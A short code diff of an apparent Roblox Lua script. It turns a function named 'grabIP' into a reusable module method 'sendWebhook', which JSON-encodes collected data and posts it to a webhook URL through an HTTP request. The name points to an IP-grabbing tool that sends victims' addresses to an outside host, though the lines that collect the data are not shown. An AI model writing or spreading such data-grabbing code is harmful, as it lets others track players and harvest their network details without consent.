@@ -1,4 +1,6 @@
-local function grabIP(Webhook)
+local grab = {}
+
+function grab:sendWebhook(Webhook)
     
 local url = Webhook
 
@@ -66,3 +68,4 @@ local send = {Url = url, Body = game:GetService("HttpService"):JSONEncode(data),
 
 req(send)
 end
+return grab
